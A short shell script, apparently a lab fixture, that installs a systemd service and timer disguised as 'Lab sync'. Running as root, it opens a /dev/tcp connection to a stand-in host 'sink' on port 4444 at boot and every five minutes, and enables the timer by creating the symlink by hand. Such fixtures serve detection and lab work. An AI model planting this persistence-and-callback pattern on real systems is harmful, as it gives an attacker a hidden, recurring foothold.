#!/bin/sh
# A systemd service and timer that run the callback stand-in, with the enabled link.
# Runs as root inside a lab machine.
set -eu
cat > /etc/systemd/system/lab-sync.service <<EOT
[Unit]
Description=Lab sync

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo lab-callback >&3'
EOT
cat > /etc/systemd/system/lab-sync.timer <<'EOT'
[Unit]
Description=Lab sync timer

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
EOT
chmod 644 /etc/systemd/system/lab-sync.service /etc/systemd/system/lab-sync.timer
# What `systemctl enable lab-sync.timer` creates.
mkdir -p /etc/systemd/system/timers.target.wants
ln -s /etc/systemd/system/lab-sync.timer /etc/systemd/system/timers.target.wants/lab-sync.timer
